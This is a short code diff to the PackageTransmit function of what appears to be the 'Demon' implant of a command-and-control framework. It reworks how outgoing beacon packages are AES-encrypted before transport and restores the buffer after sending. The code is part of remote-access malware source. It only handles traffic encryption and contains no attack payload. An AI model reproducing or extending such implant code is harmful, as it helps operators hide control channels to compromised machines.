@@ -178,6 +178,7 @@ BOOL PackageTransmit( PPACKAGE Package, PVOID* Response, PSIZE_T Size )
 {
     AESCTX AesCtx  = { 0 };
     BOOL   Success = FALSE;
+    UINT32 Padding = 0;
 
     if ( Package )
     {
@@ -192,20 +193,13 @@ BOOL PackageTransmit( PPACKAGE Package, PVOID* Response, PSIZE_T Size )
 
         if ( Package->Encrypt )
         {
-            UINT32 Padding = sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 );
+            Padding = sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 );
 
             if ( Package->CommandID == DEMON_INITIALIZE ) // only add these on init or key exchange
                 Padding += 32 + 16;
 
-
-            if ( !( Instance.IsMetadataEncrypted && Package->CommandID == DEMON_INITIALIZE ) )
-            {
-                AesInit( &AesCtx, Instance.Config.AES.Key, Instance.Config.AES.IV );
-                AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
-            }
-
-            if (Package->CommandID == DEMON_INITIALIZE)
-                Instance.IsMetadataEncrypted = TRUE;
+            AesInit( &AesCtx, Instance.Config.AES.Key, Instance.Config.AES.IV );
+            AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
         }
 
         if ( TransportSend( Package->Buffer, Package->Length, Response, Size ) )
@@ -213,6 +207,8 @@ BOOL PackageTransmit( PPACKAGE Package, PVOID* Response, PSIZE_T Size )
 
         if ( Package->Destroy )
             PackageDestroy( Package );
+        else if ( Package->Encrypt )
+            AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
     }
     else
     {
